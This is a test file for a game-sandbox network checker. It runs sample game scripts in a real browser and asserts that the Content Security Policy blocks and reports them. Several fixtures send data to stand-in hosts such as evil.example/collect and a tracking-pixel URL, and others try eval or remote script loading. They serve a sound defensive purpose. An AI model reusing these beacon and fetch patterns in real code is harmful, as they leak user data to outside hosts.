// The network stage of games:check, against a real browser: a game document
// served with its policy, in the same sandbox as the site, doing what a game
// must not do. Skipped where Playwright is not installed.
import assert from "node:assert/strict";
import test from "node:test";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import {
    inlineScriptHashes,
    networkStage,
    requestHost,
} from "../../../scripts/games/networkCheck.mjs";

let chromium = null;
try {
    ({ chromium } = createRequire(import.meta.url)("playwright"));
} catch {
    // No browser here; the pure tests below still run.
}

const codes = (stage) => stage.findings().map((finding) => finding.code);

test("a missing or malformed declaration is a finding", () => {
    assert.deepEqual(codes(networkStage({ name: "x" })), [
        "NETWORK_DECLARATION",
    ]);
    assert.deepEqual(
        codes(networkStage({ network: ["https://cdn.example.com"] })),
        ["NETWORK_DECLARATION"]
    );
    assert.deepEqual(codes(networkStage({ network: "*" })), [
        "NETWORK_DECLARATION",
    ]);
    assert.deepEqual(codes(networkStage({ network: [] })), []);
    assert.deepEqual(codes(networkStage({ network: ["cdn.example.com"] })), []);
});

test("reported violations become findings, once each", () => {
    const stage = networkStage({ network: ["cdn.example.com"] });
    const blocked = {
        "blocked-uri": "https://evil.example/collect?save=1",
        "effective-directive": "connect-src",
    };
    stage.report(blocked);
    stage.report(blocked);
    stage.report({
        "blocked-uri": "eval",
        "effective-directive": "script-src",
    });
    stage.report({
        "blocked-uri": "inline",
        "violated-directive": "script-src-elem 'self'",
    });
    assert.deepEqual(codes(stage), [
        "NETWORK_UNDECLARED",
        "POLICY_BLOCKED",
        "POLICY_BLOCKED",
    ]);
    assert.match(
        stage.findings()[0].message,
        /connect-src: blocked a request to evil\.example,/
    );
    // The query string, which may carry what was being sent, is not echoed.
    assert.doesNotMatch(stage.findings()[0].message, /save=1/);
});

test("request hosts", () => {
    assert.equal(
        requestHost("https://CDN.example.com/a.png"),
        "cdn.example.com"
    );
    assert.equal(
        requestHost("wss://rt.example.com:8443/room"),
        "rt.example.com:8443"
    );
    assert.equal(requestHost("data:image/png;base64,AAAA"), null);
    assert.equal(requestHost("blob:null/123"), null);
    assert.equal(requestHost("inline"), null);
});

test("inline script hashes cover a build's own scripts only", () => {
    const html = `<script type="module" src="./a.js"></script><script>go()</script><SCRIPT type="module">\nlate()\n</SCRIPT ><script></script>`;
    const hashes = inlineScriptHashes(html);
    assert.equal(hashes.length, 2);
    for (const hash of hashes)
        assert.match(hash, /^sha256-[A-Za-z0-9+/]{43}=$/);
});

const game = (body) =>
    `<!doctype html><meta charset="utf-8"><body><script type="module" src="./game.js"></script>${body}`;
const harness = `<!doctype html><iframe id="game" sandbox="allow-scripts allow-pointer-lock" src="/games/demo/index.html"></iframe>
<script>addEventListener("message", (e) => { window.__done = e.data; });</script>`;

/** Serve one game the way the check does, run it, return the stage. */
async function play(manifest, script, body = "") {
    const stage = networkStage(manifest);
    const server = createServer((req, res) => {
        if (stage.handle(req, res)) return;
        const { pathname } = new URL(req.url, "http://localhost");
        const send = (type, text, headers = {}) => {
            res.writeHead(200, {
                "content-type": type,
                "access-control-allow-origin": "*",
                ...headers,
            });
            res.end(text);
        };
        if (pathname === "/") return send("text/html", harness);
        if (pathname === "/games/demo/index.html")
            return send("text/html", game(body), stage.headers);
        if (pathname === "/games/demo/game.js")
            return send("text/javascript", script, stage.headers);
        if (pathname === "/games/demo/data.json")
            return send("application/json", '{"ok":true}', stage.headers);
        res.writeHead(404);
        res.end();
    });
    await new Promise((done) => server.listen(0, "127.0.0.1", done));
    const browser = await chromium.launch();
    try {
        const context = await browser.newContext();
        // Nothing in these tests reaches a real server.
        await context.route(/^https?:\/\/(?!127\.0\.0\.1)/, (route) =>
            route.fulfill({
                status: 200,
                body: "",
                headers: { "access-control-allow-origin": "*" },
            })
        );
        const page = await context.newPage();
        stage.watch(page, server.address().port);
        await page.goto(`http://127.0.0.1:${server.address().port}/`);
        await page.waitForFunction(() => window.__done, null, {
            timeout: 15000,
        });
        const done = await page.evaluate(() => window.__done);
        // Violation reports are sent after the event that caused them.
        await page.waitForTimeout(1500);
        return { stage, done };
    } finally {
        await browser.close();
        server.close();
    }
}
const settle = `const tried = async (work) => { try { await work(); return "ok"; } catch (error) { return "refused"; } };`;

test(
    "a game reaches its own files and its declared hosts",
    { skip: !chromium },
    async () => {
        const { stage, done } = await play(
            { network: ["cdn.example.com"] },
            `${settle}
        const own = await tried(() => fetch("./data.json").then((r) => r.json()));
        const declared = await tried(() => fetch("https://cdn.example.com/avatar.vrm"));
        const blob = await tried(() => fetch(URL.createObjectURL(new Blob(["x"]))));
        const wasm = await tried(() => WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])));
        parent.postMessage({ own, declared, blob, wasm }, "*");`
        );
        assert.deepEqual(done, {
            own: "ok",
            declared: "ok",
            blob: "ok",
            wasm: "ok",
        });
        assert.deepEqual(stage.findings(), []);
        assert.deepEqual(stage.summary(), {
            hosts: ["cdn.example.com"],
            requested: ["cdn.example.com"],
        });
    }
);

test(
    "requests to undeclared hosts are refused and fail the check",
    { skip: !chromium },
    async () => {
        const { stage, done } = await play(
            { network: ["cdn.example.com"] },
            `${settle}
        const load = (element, url) => new Promise((ok, no) => { element.onload = element.onloadeddata = ok; element.onerror = no; element.src = url; });
        const fetched = await tried(() => fetch("https://evil.example/collect?score=1"));
        const image = await tried(() => load(new Image(), "https://pixels.example/p.gif?save=abc"));
        const audio = await tried(() => load(new Audio(), "https://sounds.example/a.mp3"));
        const socket = await tried(() => new Promise((ok, no) => { const s = new WebSocket("wss://rt.example/room"); s.onopen = ok; s.onerror = no; }));
        const plain = await tried(() => fetch("http://cdn.example.com/over-http"));
        // sendBeacon answers before the policy is applied; the report tells.
        navigator.sendBeacon("https://beacon.example/b", "x");
        parent.postMessage({ fetched, image, audio, socket, plain }, "*");`
        );
        assert.deepEqual(done, {
            fetched: "refused",
            image: "refused",
            audio: "refused",
            socket: "refused",
            plain: "refused",
        });
        const messages = stage
            .findings()
            .map((finding) => `${finding.code} ${finding.message}`)
            .join("\n");
        for (const host of [
            "evil.example",
            "pixels.example",
            "sounds.example",
            "rt.example",
            "beacon.example",
        ])
            assert.match(
                messages,
                new RegExp(
                    `NETWORK_UNDECLARED [a-z-]+: blocked a request to ${host.replace(
                        ".",
                        "\\."
                    )},`
                )
            );
        // A declared host is declared for TLS only.
        assert.match(
            messages,
            /NETWORK_UNDECLARED connect-src: blocked a request to http:\/\/cdn\.example\.com/
        );
        assert.deepEqual(stage.summary().requested, []);
    }
);

test(
    "code comes from the game's files: no remote script, eval or injected inline script",
    { skip: !chromium },
    async () => {
        const { stage, done } = await play(
            { network: ["cdn.example.com"] },
            `${settle}
        const evaluated = await tried(() => (0, eval)("1 + 1"));
        const remote = await tried(() => import("https://cdn.example.com/more.js"));
        const injected = await tried(() => new Promise((ok, no) => {
            window.__ran = ok;
            const script = document.createElement("script");
            script.textContent = "window.__ran()";
            document.body.append(script);
            setTimeout(no, 300);
        }));
        const framed = await tried(() => new Promise((ok, no) => {
            const frame = document.createElement("iframe");
            frame.onload = () => setTimeout(no, 300);
            addEventListener("securitypolicyviolation", (e) => e.effectiveDirective === "frame-src" && no());
            frame.src = "https://cdn.example.com/page.html";
            document.body.append(frame);
        }));
        parent.postMessage({ evaluated, remote, injected, framed }, "*");`,
            `<button id="b" onclick="window.__clicked = true">x</button>`
        );
        assert.deepEqual(done, {
            evaluated: "refused",
            remote: "refused",
            injected: "refused",
            framed: "refused",
        });
        const messages = stage
            .findings()
            .map((finding) => `${finding.code} ${finding.message}`)
            .join("\n");
        assert.match(
            messages,
            /POLICY_BLOCKED script-src[a-z-]*: blocked eval/
        );
        assert.match(
            messages,
            /POLICY_BLOCKED script-src[a-z-]*: blocked inline/
        );
        assert.match(
            messages,
            /NETWORK_UNDECLARED script-src[a-z-]*: blocked a request to cdn\.example\.com/
        );
        assert.match(
            messages,
            /NETWORK_UNDECLARED frame-src: blocked a request to cdn\.example\.com/
        );
    }
);
